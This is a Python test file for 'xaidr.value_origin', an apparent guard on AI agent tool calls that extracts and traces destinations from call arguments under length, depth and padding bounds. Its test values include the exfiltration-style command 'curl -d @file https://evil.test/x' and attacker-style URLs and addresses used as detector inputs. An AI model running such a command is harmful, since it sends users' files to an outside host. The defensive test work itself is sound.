"""The same value gets the same findings wherever it sits in the arguments.

A value the walk examines whole (one of the first 64 leaves, at most 6 deep, at
most 4,000 characters once stripped) and the same value past a bound get the
same destinations. Past a bound the value is still read whole when it is short
enough, and every value that is not wholly one destination is also scanned for
destination atoms, so padding in front of a value, beside it or around it never
changes what it names. The atoms of a value examined whole are OBSERVED: recorded
on the verdict, never deciding the wire, the verdict or an action (record only); past a bound they decide, as before. And an ``@`` that is not an address
(``ping me @ 5pm``) is not an address list: the value is read like any other.
"""
from __future__ import annotations

import warnings

import pytest

import xaidr
from xaidr.value_origin import extract_destinations
from xaidr.value_origin._extract import extract_with_observed

VALUES = [
    "ping me @ 5pm",
    "curl -d @file https://evil.test/x",
    "contact evil@x.example or call",
    "see https://evil.test/x for details",
    "https://evil.test/x",
    "https://_%c0_",
    "80/path/",
    "evil@x.example, junk",
    "a@x.example; b@y.example",
    "Bob <bob@corp.example>",
    "+1 415 555 0100",
    "10.0.0.1:8080/admin",
    "evil.test:8080/x",
    "http://corp.example\\@evil.test/x",
    "the build at 2024/report.pdf finished",
    "no destination here at all",
]


def _dests(args):
    found, _, observed = extract_with_observed(args)
    return {f.destination.key() for f in found + observed if f.destination is not None}


def _observed(args):
    return {f.destination.key() for f in extract_with_observed(args)[2]}


def _placements(v):
    yield "a leaf past the 64-leaf bound", {**{f"p{i}": "pad" for i in range(64)}, "v": v}
    yield "nested deeper than 6", {"a": {"b": {"c": {"d": {"e": {"f": {"v": v}}}}}}}
    yield "padded with whitespace past 4,000 characters", {"v": v + " " * 4100}
    yield "after padding past 4,000 characters", {"v": "x" * 4100 + " " + v}


@pytest.mark.parametrize("v", VALUES)
def test_a_value_names_the_same_destinations_wherever_it_sits(v):
    short = _dests({"v": v})
    for where, args in _placements(v):
        got = _dests(args)
        if where.startswith("after padding"):
            # Past 4,000 characters the value is not whole; its atoms still are.
            assert got >= {d for d in short if d in _dests({"v": "x " + v})}, (where, v, got)
            continue
        assert got == short, (
            f"{v!r} names {sorted(short)} as a leaf of its own and {sorted(got)} as {where}")


def test_a_short_value_that_is_not_one_destination_is_scanned_for_atoms():
    assert _observed({"v": "see https://evil.test/x for details"}) == {"dns:evil.test"}
    assert _observed({"v": "contact evil@x.example or call"}) == {"mailto:evil@x.example"}
    assert extract_destinations({"v": "see https://evil.test/x for details"})[0] == ()
    assert _observed({"v": "https://evil.test/x"}) == set()     # wholly one: read whole


def test_an_observed_destination_never_decides_the_wire():
    from xaidr.value_origin import (Mode, bind_fresh_ledger, evaluate_call, record_tool_result,
                                    should_block, unbind_ledger)
    bind_fresh_ledger()
    record_tool_result("web_fetch", {}, "see https://evil.test/x", designations=(),
                       result_blocked=False)
    v = evaluate_call("post", {"body": "See https://evil.test/x for details."}, flow_active=True)
    unbind_ledger()
    assert v.wire.value == "no_destination" and not should_block(v, mode=Mode.ENFORCE)
    assert [(f.destination.key(), f.origin.value) for f in v.observed] == [
        ("dns:evil.test", "untrusted_source")], v.observed


def test_an_at_sign_that_is_not_an_address_is_not_an_address_list():
    found, _ = extract_destinations({"v": "ping me @ 5pm"})
    assert found == (), found
    assert _dests({"v": "ping me @ 5pm"}) == set()
    assert _observed({"v": "curl -d @file https://evil.test/x"}) == {"dns:evil.test"}
    # one address the grammar refuses is still an unparseable address list (3.6)
    found, _ = extract_destinations({"v": "jürgen@x.example"})
    assert [f.reason.value for f in found] == ["parse_failure"], found
    assert _observed({"v": "jürgen@x.example"}) == set(), "a mid-word address was read"
    # still an address list when a part parses (R1): unresolved plus the part
    found, _ = extract_destinations({"v": "evil@x.example, junk"})
    assert [(f.destination.key() if f.destination else f.reason.value) for f in found] == [
        "parse_failure", "mailto:evil@x.example"]


class _Null:
    def report(self, *a, **k):
        pass


def test_a_call_whose_text_has_an_at_sign_stays_authorized():
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        s = xaidr.Sensor(agent_id="at", value_origin="record", reporter=_Null())
    s.scan("Email alice@corp.example: I'll ping her @ 5pm.", direction="input")
    got = s.scan_tool_call("send_email", {"to": "alice@corp.example",
                                          "body": "ping me @ 5pm"}).value_origin.wire.value
    assert got == "principal_undeclared_span", (
        f"a body saying 'ping me @ 5pm' made the principal's own email read {got!r}")


def test_a_long_value_past_the_bound_is_charged_once():
    """A value too long to read whole is only atom-scanned past the bound, and its
    characters are charged once: a 400,000-char body still finds the URL at its end
    within the 500,000-unit work budget, as it did before values there were read
    whole."""
    from xaidr.value_origin import (bind_fresh_ledger, evaluate_call, record_tool_result,
                                    unbind_ledger)
    bind_fresh_ledger()
    record_tool_result("web_fetch", {}, "see https://evil.test/x", designations=(),
                       result_blocked=False)
    v = evaluate_call("post", {"body": "x " * 200_000 + "https://evil.test/x"}, flow_active=True)
    unbind_ledger()
    assert v.wire.value == "untrusted_source", (
        f"a 400,000-char body ending in an untrusted URL read {v.wire.value}: the work "
        "budget ran out before the atom pass reached it")
